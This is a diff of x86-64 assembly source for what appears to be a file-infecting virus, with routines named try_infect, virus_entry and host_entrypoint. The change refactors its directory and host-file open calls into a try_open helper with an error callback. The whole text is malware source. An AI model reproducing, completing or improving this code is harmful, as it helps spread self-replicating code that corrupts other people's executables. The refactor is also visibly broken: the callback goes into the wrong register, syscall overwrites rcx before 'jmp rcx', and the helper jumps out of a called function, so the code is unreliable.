@@ -176,11 +176,9 @@ _start:
         mov r14, rdi
 
         mov rsi, O_DIRECTORY | O_RDONLY
-        mov rax, SYS_OPEN
-        syscall
-
-        test rax, rax
-        jl .close_directory
+        lea rdx, [rel .close_directory]
+        xor rcx, rcx
+        call try_open
 
         mov data(dir_fd), rax
 
@@ -270,10 +268,9 @@ try_infect:
 
     mov rsi, O_RDWR
     xor rdx, rdx
-    mov rax, SYS_OPEN
-    syscall
-    test rax, rax
-    jl .return
+    lea rcx, [rel .return]
+    call try_open
+
     mov data(host_fd), rax
 
     lea rsi, data(stat)
@@ -412,8 +409,18 @@ get_base_address:
     lea rax, [rel _start]
     mov rdx, [rel virus_entry]
     sub rax, rdx
-    add rax, [rel host_entry]
+    add rax, [rel host_entrypoint]
     ret
+
+; int try_open(rdi=char*, rsi=flags, rdx=mode, rcx=callback)
+try_open:
+    mov rax, SYS_OPEN
+    syscall
+    test rax, rax
+    jl .error
+    ret
+    .error:
+        jmp rcx
 
 ; write (rdi=char*, rsi=len)
 write:
